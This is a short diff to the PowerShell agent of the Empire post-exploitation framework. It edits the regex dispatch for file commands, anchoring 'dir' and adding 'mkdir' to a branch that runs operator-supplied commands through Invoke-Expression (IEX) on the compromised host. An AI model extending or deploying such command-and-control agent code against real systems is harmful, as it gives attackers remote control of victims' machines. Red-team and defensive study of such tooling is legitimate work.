@@ -279,7 +279,7 @@ function Invoke-Empire {
         }
         else {
             switch -regex ($cmd) {
-                '(ls|dir)' {
+                '(ls|^dir)' {
                     if ($cmdargs.length -eq "") {
                         $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name
                     }
@@ -292,7 +292,7 @@ function Invoke-Empire {
                         }
                     }
                 }
-                '(mv|move|copy|cp|rm|del|rmdir)' {
+                '(mv|move|copy|cp|rm|del|rmdir|mkdir)' {
                     if ($cmdargs.length -ne "") {
                         try {
                             IEX "$cmd $cmdargs -Force -ErrorAction Stop"
